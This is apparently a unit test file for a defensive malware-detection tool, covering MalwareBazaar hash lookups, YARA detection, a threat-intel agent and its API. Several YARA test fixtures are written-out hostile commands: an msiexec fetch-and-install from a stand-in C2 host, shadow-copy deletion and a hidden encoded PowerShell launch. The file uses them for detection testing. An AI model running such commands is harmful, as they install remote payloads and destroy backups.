"""Unit tests for MalwareBazaar integration, vx-underground YARA rules, and Threat Intelligence Agent."""

from pathlib import Path
from unittest.mock import AsyncMock, MagicMock, patch

import pytest
from fastapi.testclient import TestClient

from sentinel.agents.client import GatewayClient
from sentinel.agents.intel import IntelAgent
from sentinel.agents.schemas import FileFeatures
from sentinel.intel.malwarebazaar import MalwareBazaarClient, MalwareBazaarResult
from sentinel.scan.yara_scanner import DEFAULT_YARA_RULES_PATH, YaraScanner
from sentinel.services.intel_service import IntelService
from sentinel.store.db import init_database
from sentinel.ui.web import ui_app


@pytest.fixture
def temp_audit_db(tmp_path: Path) -> Path:
    db_file = tmp_path / "test_intel_audit.db"
    init_database(db_file)
    return db_file


@pytest.fixture
def client() -> TestClient:
    return TestClient(ui_app)


# ------------------------------------------------------------------------------
# 1. MalwareBazaar Client Unit Tests
# ------------------------------------------------------------------------------
@pytest.mark.asyncio
async def test_malwarebazaar_lookup_hit() -> None:
    client = MalwareBazaarClient(api_key="test_key")
    mock_response_data = {
        "query_status": "ok",
        "data": [
            {
                "sha256_hash": "2c27b0c36a6e7686b360f0de202575239a5dc4be9beaf4f4514214f5539fa990",
                "signature": "RaspberryRobin",
                "tags": ["usb", "worm", "lnk"],
                "file_type": "lnk",
                "delivery_method": "usb",
                "reporter": "abuse_ch",
            }
        ],
    }

    with patch("httpx.AsyncClient.post") as mock_post:
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.json.return_value = mock_response_data
        mock_post.return_value = mock_resp

        result = await client.lookup_hash("2c27b0c36a6e7686b360f0de202575239a5dc4be9beaf4f4514214f5539fa990")

        assert result.query_status == "ok"
        assert result.is_malicious is True
        assert result.signature == "RaspberryRobin"
        assert "usb" in result.tags
        assert result.delivery_method == "usb"


@pytest.mark.asyncio
async def test_malwarebazaar_lookup_miss() -> None:
    client = MalwareBazaarClient()
    mock_response_data = {"query_status": "hash_not_found"}

    with patch("httpx.AsyncClient.post") as mock_post:
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.json.return_value = mock_response_data
        mock_post.return_value = mock_resp

        result = await client.lookup_hash("e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855")

        assert result.query_status == "hash_not_found"
        assert result.is_malicious is False
        assert result.signature is None


# ------------------------------------------------------------------------------
# 2. YARA Rules Compilation and Pattern Matching (vx-underground & MalwareBazaar)
# ------------------------------------------------------------------------------
def test_yara_master_rules_compilation() -> None:
    """Ensure master index.yar and all included rules compile without syntax error."""
    assert DEFAULT_YARA_RULES_PATH.exists()
    scanner = YaraScanner(rules_path=DEFAULT_YARA_RULES_PATH)
    assert scanner.init_error is None
    assert scanner.compiled_rules is not None


def test_yara_detection_raspberry_robin() -> None:
    scanner = YaraScanner(rules_path=DEFAULT_YARA_RULES_PATH)
    sample_payload = b"cmd.exe /r msiexec /q /n -i http://malicious-c2.test/payload.msi"
    scan_res = scanner.scan_data(sample_payload)

    assert scan_res.scanners_ok is True
    assert "RaspberryRobin_USB_Worm" in scan_res.hits


def test_yara_detection_lockbit_ransomware() -> None:
    scanner = YaraScanner(rules_path=DEFAULT_YARA_RULES_PATH)
    sample_payload = b"LockBit 3.0 vssadmin Delete Shadows /All /Quiet and wmic shadowcopy delete"
    scan_res = scanner.scan_data(sample_payload)

    assert scan_res.scanners_ok is True
    assert "LockBit_Ransomware_Indicators" in scan_res.hits
    assert "Generic_ShadowCopy_Wiper" in scan_res.hits


def test_yara_detection_redline_stealer() -> None:
    scanner = YaraScanner(rules_path=DEFAULT_YARA_RULES_PATH)
    sample_payload = b"RedLineStealer credential grabbing routine"
    scan_res = scanner.scan_data(sample_payload)

    assert scan_res.scanners_ok is True
    assert "RedLine_Stealer_Signatures" in scan_res.hits


def test_yara_detection_encoded_powershell() -> None:
    scanner = YaraScanner(rules_path=DEFAULT_YARA_RULES_PATH)
    sample_payload = b"powershell -w hidden -enc JAB4ACAAPQAgACIAMgAiAA=="
    scan_res = scanner.scan_data(sample_payload)

    assert scan_res.scanners_ok is True
    assert "Suspicious_Encoded_PowerShell" in scan_res.hits


# ------------------------------------------------------------------------------
# 3. IntelAgent Multi-Tier Lookup and Caching
# ------------------------------------------------------------------------------
@pytest.mark.asyncio
async def test_intel_agent_with_malwarebazaar_hit(temp_audit_db: Path) -> None:
    gw_client = GatewayClient(base_url="http://mock.test", device_token="token")
    mock_mb = MalwareBazaarClient()

    test_hash = "2c27b0c36a6e7686b360f0de202575239a5dc4be9beaf4f4514214f5539fa990"
    features = FileFeatures(
        file_id="test_malware.exe",
        sha256=test_hash,
        size=1024,
        entropy=6.5,
        detected_type="exe",
        ext_mismatch=False,
    )

    with patch.object(mock_mb, "lookup_hash", new_callable=AsyncMock) as mock_lookup:
        mock_lookup.return_value = MalwareBazaarResult(
            query_status="ok",
            sha256_hash=test_hash,
            is_malicious=True,
            signature="RaspberryRobin",
            tags=["usb", "worm"],
        )

        agent = IntelAgent(client=gw_client, db_path=temp_audit_db, malwarebazaar_client=mock_mb)
        resp = await agent.lookup_hash(features)

        assert resp.status == "success"
        assert resp.verdict is not None
        assert resp.verdict.verdict == "malicious"
        assert resp.verdict.risk_score == 1.0
        assert "RaspberryRobin" in resp.verdict.reasons[0]

        # Check that it is now cached in SQLite
        cached = agent._lookup_cache(test_hash)
        assert cached is not None
        assert cached[0] == "bad"
        assert "malwarebazaar:RaspberryRobin" in cached[1]


# ------------------------------------------------------------------------------
# 4. IntelService & API Endpoints
# ------------------------------------------------------------------------------
def test_intel_service_stats_and_seeding(temp_audit_db: Path) -> None:
    # 1. Check initial stats on empty DB
    stats_empty = IntelService.get_stats(temp_audit_db)
    assert stats_empty["total_hashes"] == 0
    assert stats_empty["yara_rules_count"] >= 14
    assert "RaspberryRobin" in stats_empty["yara_families"]

    # 2. Seed offline feed
    inserted = IntelService.seed_offline_feed(temp_audit_db)
    assert inserted >= 15

    # 3. Verify updated stats
    stats_seeded = IntelService.get_stats(temp_audit_db)
    assert stats_seeded["malicious_hashes"] == inserted
    assert stats_seeded["total_hashes"] == inserted


def test_api_intel_endpoints(client: TestClient) -> None:
    # GET /api/intel/stats
    res = client.get("/api/intel/stats")
    assert res.status_code == 200
    data = res.json()
    assert "total_hashes" in data
    assert "yara_rules_count" in data

    # POST /api/intel/seed
    res_seed = client.post("/api/intel/seed")
    assert res_seed.status_code == 200
    seed_data = res_seed.json()
    assert seed_data["success"] is True
    assert seed_data["seeded_count"] >= 15
